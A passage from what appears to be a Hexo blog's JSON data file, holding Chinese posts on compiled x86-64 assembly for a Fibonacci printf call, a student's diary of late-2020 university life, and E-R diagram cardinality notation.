class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">printf(&quot;fib(%lld) &#x3D; %lld \\n&quot;, i, fib(i));</span><br></pre></td></tr></table></figure>\n<p>首先，字符串<code>&quot;fib(%lld) = %lld \\n&quot;</code>是位于<code>.LC0</code>处的。把字符串的首地址存入内存</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subq\t$8, %rsp</span><br><span class=\"line\">movq\t$.LC0, %rax</span><br><span class=\"line\">movq\t%rax, -40(%rbp)</span><br></pre></td></tr></table></figure>\n<p>然后运算了<code>fib(i)</code>，变量<code>i</code> 在<code>-8(%rbp)</code>内存中。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movq\t-8(%rbp), %rdi</span><br><span class=\"line\">call\t fib</span><br></pre></td></tr></table></figure>\n<p><code>fib</code>返回之后将<code>%rax</code>中的值存入内存，再调用<code>printf</code>函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subq\t$8, %rsp\t&#x2F;&#x2F; 分配内存</span><br><span class=\"line\">movq\t%rax, -48(%rbp)</span><br><span class=\"line\">movq\t-40(%rbp), %rdi\t&#x2F;&#x2F; 字符串</span><br><span class=\"line\">movq\t-8(%rbp), %rsi\t&#x2F;&#x2F; i</span><br><span class=\"line\">movq\t-48(%rbp), %rdx\t&#x2F;&#x2F; fib(i)</span><br><span class=\"line\">subq\t$8, %rsp</span><br><span class=\"line\">movl\t$0, %eax</span><br><span class=\"line\">call\tprintf</span><br></pre></td></tr></table></figure>\n<p>除了这个比较复杂的函数以外，其他都没什么问题，要注意一下<strong>caller-saved register</strong>和<strong>callee-saved register</strong>。</p>\n"},{"title":"心情随记","top_img":false,"cover":"/img/cover2.jpeg","date":"2020-11-04T05:10:56.000Z","sticky":true,"_content":"抛弃网易云和QQ，拥抱Spotify。\n****\n2020年12月17号，我终于通过自己的一点点精力和大部分百度完成了这学期大部分的事情，我很满足。\n\n很巧的是，今天又和另一位软院的朋友聊了聊。走在路上，我无法控制地去想，我这样孤注一掷真的会成功吗？\n\n回寝室的路上，天气很冷，我又看到了很多很多的情侣。不知道冬天是不是和爱情特别配、还是情侣喜欢在冷天出没，冬天的夜晚确实有很多的情侣。我原本还挺热乎的，但身体的温度很快就挡不住冷天，降了下来。如果这四年里没有谈过恋爱，似乎也挺悲哀的吧。\n\n好冷。\n\n****\n2020年12月3号，我在冷风里拖着鼻涕走路。\n****\n昨天连夜把编译原理给冲了，冲完之后感觉很开心。\n\n<hr />\n\n我也希望能在我本科毕业之后，写一篇文章来记录我这四年的心路历程。不管是帮助别人避雷也好、指点也罢，至少能多少从国内大学教育这个黑洞中多少放出一些消息，告诉别人这个事实：国内的本科教育已经接近奔溃。\n\n<hr />\n\n2020年11月18号，好热。我还是去了东中院自习，即使我说过我不会再让东中院拒绝我第二次。我不止一次这样骗自己，但我还是忍不住飞蛾扑火。\n\n<hr />\n2020年11月16号，结掉了一门选修，认识了一个有趣的朋友。今天天气尤其好。\n<hr />\n\n2020年11月5号，还有一大堆事情没做完，我快被破防了。或许有人愿意和我聊聊天吗？约自习也是可以的......来和我说说话吧。\n<hr />\n\n2020年11月4日下午，我在东中院自习被一位老师赶走了，因为他要用这个教室给学生期中考试。我抱着书去了图书馆，我也不会再去东中院自习。既然被拒绝了一次，那我也不会再给它拒绝我的机会。\n\n","source":"_posts/心情随记.md","raw":"---\ntitle: 心情随记\ntop_img: false\ncover: /img/cover2.jpeg\ndate: 2020-11-04 13:10:56\ntags:\n- 杂谈\nsticky: true\n---\n抛弃网易云和QQ，拥抱Spotify。\n****\n2020年12月17号，我终于通过自己的一点点精力和大部分百度完成了这学期大部分的事情，我很满足。\n\n很巧的是，今天又和另一位软院的朋友聊了聊。走在路上，我无法控制地去想，我这样孤注一掷真的会成功吗？\n\n回寝室的路上，天气很冷，我又看到了很多很多的情侣。不知道冬天是不是和爱情特别配、还是情侣喜欢在冷天出没，冬天的夜晚确实有很多的情侣。我原本还挺热乎的，但身体的温度很快就挡不住冷天，降了下来。如果这四年里没有谈过恋爱，似乎也挺悲哀的吧。\n\n好冷。\n\n****\n2020年12月3号，我在冷风里拖着鼻涕走路。\n****\n昨天连夜把编译原理给冲了，冲完之后感觉很开心。\n\n<hr />\n\n我也希望能在我本科毕业之后，写一篇文章来记录我这四年的心路历程。不管是帮助别人避雷也好、指点也罢，至少能多少从国内大学教育这个黑洞中多少放出一些消息，告诉别人这个事实：国内的本科教育已经接近奔溃。\n\n<hr />\n\n2020年11月18号，好热。我还是去了东中院自习，即使我说过我不会再让东中院拒绝我第二次。我不止一次这样骗自己，但我还是忍不住飞蛾扑火。\n\n<hr />\n2020年11月16号，结掉了一门选修，认识了一个有趣的朋友。今天天气尤其好。\n<hr />\n\n2020年11月5号，还有一大堆事情没做完，我快被破防了。或许有人愿意和我聊聊天吗？约自习也是可以的......来和我说说话吧。\n<hr />\n\n2020年11月4日下午，我在东中院自习被一位老师赶走了，因为他要用这个教室给学生期中考试。我抱着书去了图书馆，我也不会再去东中院自习。既然被拒绝了一次，那我也不会再给它拒绝我的机会。\n\n","slug":"心情随记","published":1,"updated":"2021-01-21T04:22:44.832Z","_id":"ckiszi5af000g98wa2zntci7o","comments":1,"layout":"post","photos":[],"link":"","content":"<p>抛弃网易云和QQ，拥抱Spotify。</p>\n<hr />\n<p>2020年12月17号，我终于通过自己的一点点精力和大部分百度完成了这学期大部分的事情，我很满足。</p>\n<p>很巧的是，今天又和另一位软院的朋友聊了聊。走在路上，我无法控制地去想，我这样孤注一掷真的会成功吗？</p>\n<p>回寝室的路上，天气很冷，我又看到了很多很多的情侣。不知道冬天是不是和爱情特别配、还是情侣喜欢在冷天出没，冬天的夜晚确实有很多的情侣。我原本还挺热乎的，但身体的温度很快就挡不住冷天，降了下来。如果这四年里没有谈过恋爱，似乎也挺悲哀的吧。</p>\n<p>好冷。</p>\n<hr />\n<p>2020年12月3号，我在冷风里拖着鼻涕走路。</p>\n<hr />\n<p>昨天连夜把编译原理给冲了，冲完之后感觉很开心。</p>\n<hr />\n<p>我也希望能在我本科毕业之后，写一篇文章来记录我这四年的心路历程。不管是帮助别人避雷也好、指点也罢，至少能多少从国内大学教育这个黑洞中多少放出一些消息，告诉别人这个事实：国内的本科教育已经接近奔溃。</p>\n<hr />\n<p>2020年11月18号，好热。我还是去了东中院自习，即使我说过我不会再让东中院拒绝我第二次。我不止一次这样骗自己，但我还是忍不住飞蛾扑火。</p>\n<hr />\n2020年11月16号，结掉了一门选修，认识了一个有趣的朋友。今天天气尤其好。\n<hr />\n<p>2020年11月5号，还有一大堆事情没做完，我快被破防了。或许有人愿意和我聊聊天吗？约自习也是可以的…来和我说说话吧。</p>\n<hr />\n<p>2020年11月4日下午，我在东中院自习被一位老师赶走了，因为他要用这个教室给学生期中考试。我抱着书去了图书馆，我也不会再去东中院自习。既然被拒绝了一次，那我也不会再给它拒绝我的机会。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>抛弃网易云和QQ，拥抱Spotify。</p>\n<hr />\n<p>2020年12月17号，我终于通过自己的一点点精力和大部分百度完成了这学期大部分的事情，我很满足。</p>\n<p>很巧的是，今天又和另一位软院的朋友聊了聊。走在路上，我无法控制地去想，我这样孤注一掷真的会成功吗？</p>\n<p>回寝室的路上，天气很冷，我又看到了很多很多的情侣。不知道冬天是不是和爱情特别配、还是情侣喜欢在冷天出没，冬天的夜晚确实有很多的情侣。我原本还挺热乎的，但身体的温度很快就挡不住冷天，降了下来。如果这四年里没有谈过恋爱，似乎也挺悲哀的吧。</p>\n<p>好冷。</p>\n<hr />\n<p>2020年12月3号，我在冷风里拖着鼻涕走路。</p>\n<hr />\n<p>昨天连夜把编译原理给冲了，冲完之后感觉很开心。</p>\n<hr />\n<p>我也希望能在我本科毕业之后，写一篇文章来记录我这四年的心路历程。不管是帮助别人避雷也好、指点也罢，至少能多少从国内大学教育这个黑洞中多少放出一些消息，告诉别人这个事实：国内的本科教育已经接近奔溃。</p>\n<hr />\n<p>2020年11月18号，好热。我还是去了东中院自习，即使我说过我不会再让东中院拒绝我第二次。我不止一次这样骗自己，但我还是忍不住飞蛾扑火。</p>\n<hr />\n2020年11月16号，结掉了一门选修，认识了一个有趣的朋友。今天天气尤其好。\n<hr />\n<p>2020年11月5号，还有一大堆事情没做完，我快被破防了。或许有人愿意和我聊聊天吗？约自习也是可以的…来和我说说话吧。</p>\n<hr />\n<p>2020年11月4日下午，我在东中院自习被一位老师赶走了，因为他要用这个教室给学生期中考试。我抱着书去了图书馆，我也不会再去东中院自习。既然被拒绝了一次，那我也不会再给它拒绝我的机会。</p>\n"},{"title":"数据库设计中关于E-R图的一些疑难点","top_img":false,"cover":"/img/cover.jpg","date":"2020-10-31T09:07:57.000Z","katex":true,"_content":"\n上课的时候对于E-R图中**one-to-many**的chen's图感到特别困惑，所以特地梳理一下。\n# Mapping Cardinality (基数)\n{% img \"/img/db1.png\" %}\n- 图a表示**one-to-one**\n- 图b表示**one-to-many**，意为一个$instructor$可以对应多个$student$，而一个$student$对应于**至多**一个$instructor$。\n- 图c表示**many-to-many**\n\n实际上用上图表示联系是没什么信息量的，因此E-R图也提供了一种更加复杂的约束，用来约束每个实体在联系中出现的**次数**。\n\n*Database System Concepts*原文：\n\n>A line may have an associated minimum and maximum cardinality, shown in the form l..h, where l is the minimum and h the maximum cardinality. A minimum value of 1 indicates total participation of the entity set in the relationship set; that is, each entity in the entity set occurs in at least one relationship in that relationship set. A maximum value of 1 indicates that the entity participates in at most one relationship, while a maximum value ∗ indicates no limit.\n\n若一个entity的cardinality**最小值为$1$**，代表**完全参与联系**，也就是说，该entity中每一个实例都至少在联系中参与一次。\n\n{% img \"/img/db2.png\" %}\n\n以上图为例，$advisitor$和$student$连线的基数为$1..1$，这意味着$student$表中每一个学生实例都必须在联系中出现一次，也就是说每个学生都必须有且仅有一个$instructor$。而左边的$0..*$意味着一个$instructor$可以对应于零个或多个$student$。因此这张图表示的是一个**one-to-many**关系，这很容易和上面的传统表示方法混淆。\n\n实际上，带有$m..n$的联系表示方法涵盖的信息已经包括了传统表示方法能涵盖的所有信息。而这种表示方法和**crow's foot**表示方法相比，当表示的信息相同时，**联系左右的表示是相反的**。","source":"_posts/数据库设计中关于联系的一些疑难点.md","raw":"---\ntitle: 数据库设计中关于E-R图的一些疑难点\ntop_img: false\ncover: /img/cover.jpg\ndate: 2020-10-31 17:07:57\ntags:\n- 数据库\nkatex: true\n---\n\n上课的时候对于E-R图中**one-to-many**的chen's图感到特别困惑，所以特地梳理一下。\n# Mapping Cardinality (基数)\n{% img \"/img/db1.png\" %}\n- 图a表示**one-to-one**\n- 图b表示**one-to-many**，意为一个$instructor$可以对应多个$student$，而一个$student$对应于**至多**一个$instructor$。\n- 图c表示**many-to-many**\n\n实际上用上图表示联系是没什么信息量的，因此E-R图也提供了一种更加复杂的约束，用来约束每个实体在联系中出现的**次数**。\n\n*Database System Concepts*原文：\n\n>A line may have an associated minimum and maximum cardinality, shown in the form l..h, where l is the minimum and h the maximum cardinality. A minimum value of 1 indicates total participation of the entity set in the relationship set; that is, each entity in the entity set occurs in at least one relationship in that relationship set. A maximum value of 1 indicates that the entity participates in at most one relationship, while a maximum value ∗ indicates no limit.\n\n若一个entity的cardinality**最小值为$1$**，代表**完全参与联系**，也就是说，该entity中每一个实例都至少在联系中参与一次。\n\n{% img \"/img/db2.png\" %}\n\n以上图为例，$advisitor$和$student$连线的基数为$1..1$，这意味着$student$表中每一个学生实例都必须在联系中出现一次，也就是说每个学生都必须有且仅有一个$instructor$。而左边的$0..*$意味着一个$instructor$可以对应于零个或多个$student$。因此这张图表示的是一个**one-to-many**关系，这很容易和上面的传统表示方法混淆。\n\n实际上，带有$m..n$的联系表示方法涵盖的信息已经包括了传统表示方法能涵盖的所有信息。而这种表示方法和**crow's foot**表示方法相比，当表示的信息相同时，**联系左右的表示是相反的**。","slug":"数据库设计中关于联系的一些疑难点","published":1,"updated":"2020-11-04T06:33:48.510Z","_id":"ckiszi5ai000i98waadajf2yk","comments":1,"layout":"post","photos":[],"link":"","content":"<p>上课的时候对于E-R图中<strong>one-to-many</strong>的chen’s图感到特别困惑，所以特地梳理一下。</p>\n<h1 id=\"mapping-cardinality-基数\"><a class=\"markdownIt-Anchor\" href=\"#mapping-cardinality-基数\"></a> Mapping Cardinality (基数)</h1>\n<img src=\"/img/db1.png\" class=\"\">\n<ul>\n<li>图a表示<strong>one-to-one</strong></li>\n<li>图b表示<strong>one-to-many</strong>，意为一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">instructor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>可以对应多个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>，而一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>对应于<strong>至多</strong>一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">instructor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>。</li>\n<li>图c表示<strong>many-to-many</strong></li>\n</ul>\n<p>实际上用上图表示联系是没什么信息量的，因此E-R图也提供了一种更加复杂的约束，用来约束每个实体在联系中出现的<strong>次数</strong>。</p>\n<p><em>Database System Concepts</em>原文：</p>\n<blockquote>\n<p>A line may have an associated minimum and maximum cardinality, shown in the form l…h, where l is the minimum and h the maximum cardinality. A minimum value of 1 indicates total participation of the entity set in the relationship set; that is, each entity in the entity set occurs in at least one relationship in that relationship set. A maximum value of 1 indicates that the entity participates in at most one relationship, while a maximum value ∗ indicates no limit.</p>\n</blockquote>\n<p>若一个entity的cardinality<strong>最小值为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span></strong>，代表<strong>完全参与联系</strong>，也就是说，该entity中每一个实例都至少在联系中参与一次。</p>\n<img src=\"/img/db2.png\" class=\"\">\n<p>以上图为例，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi><mi>d</mi><mi>v</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">advisitor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>连线的基数为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>1..1</mn></mrow><annotation encoding=\"application/x-tex\">1..1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">1</span></span></span></span>，这意味着<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>表中每一个学生实例都必须在联系中出现一次，也就是说每个学生都必须有且仅有一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">instructor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>。而左边的<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>0..</mn><mo>∗</mo></mrow><annotation encoding=\"application/x-tex\">0..*</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">∗</span></span></span></span>意味着一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">instructor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>可以对应于零个或多个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>。因此这张图表示的是一个<strong>one-to-many</strong>关系，这很容易和上面的传统表示方法混淆。</p>\n<p>实际上，带有<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>m</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">m..n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">m</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\">n</span></span></span></span>的联系表示方法涵盖的信息已经包括了传统表示方法能涵盖的所有信息。而这种表示方法和<strong>crow’s foot</strong>表示方法相比，当表示的信息相同时，<strong>联系左右的表示是相反的</strong>。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>上课的时候对于E-R图中<strong>one-to-many</strong>的chen’s图感到特别困惑，所以特地梳理一下。</p>\n<h1 id=\"mapping-cardinality-基数\"><a class=\"markdownIt-Anchor\" href=\"#mapping-cardinality-基数\"></a> Mapping Cardinality (基数)</h1>\n<img src=\"/img/db1.png\" class=\"\">\n<ul>\n<li>图a表示<strong>one-to-one</strong></li>\n<li>图b表示<strong>one-to-many</strong>，意为一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">instructor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>可以对应多个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>，而一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span></span></span></span>对应于<strong>至多</strong>一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">instructor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">c</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>。</li>\n<li>图c表示<strong>many-to-many</strong></li>\n</ul>\n<p>实际上用上图表示联系是没什么信息量的，因此E-R图也提供了一种更加复杂的约束，用来约束每个实体在联系中出现的<strong>次数</strong>。</p>\n<p><em>Database System Concepts</em>原文：</p>\n<blockquote>\n<p>A line may have an associated minimum and maximum cardinality, shown in the form l…h, where l is the minimum and h the maximum cardinality. A minimum value of 1 indicates total participation of the entity set in the relationship set; that is, each entity in the entity set occurs in at least one relationship in that relationship set. A maximum value of 1 indicates that the entity participates in at most one relationship, while a maximum value ∗ indicates no limit.</p>\n</blockquote>\n<p>若一个entity的cardinality<strong>最小值为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span></strong>，代表<strong>完全参与联系</strong>，也就是说，该entity中每一个实例都至少在联系中参与一次。</p>\n<img src=\"/img/db2.png\" class=\"\">\n<p>以上图为例，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi><mi>d</mi><mi>v</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>t</mi><mi>o</mi><mi>r</mi></mrow><annotation encoding=\"application/x-tex\">advisitor</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">student</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span 